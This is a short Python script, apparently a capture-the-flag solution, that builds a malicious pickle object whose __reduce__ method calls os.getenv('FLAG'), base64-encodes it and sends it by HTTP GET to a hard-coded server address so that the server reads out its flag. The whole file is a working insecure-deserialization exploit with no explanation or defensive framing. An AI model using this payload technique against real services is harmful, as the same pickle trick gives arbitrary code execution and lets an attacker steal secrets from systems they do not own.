import pickle
import base64
import requests
import os

# Target server URL
url = "http://3.142.89.90:31010/?s="

# Define the exploit class to use `os.getenv` directly
class Exploit:
    def __reduce__(self):
        # Attempt to fetch the 'FLAG' environment variable
        return (os.getenv, ('FLAG',))

# Serialize and encode the payload
payload = pickle.dumps(Exploit())
b64_payload = base64.b64encode(payload).decode()

# Send the payload to the server
response = requests.get(url + b64_payload)

# Print the server's response
print(response.status_code)
print(response.text)
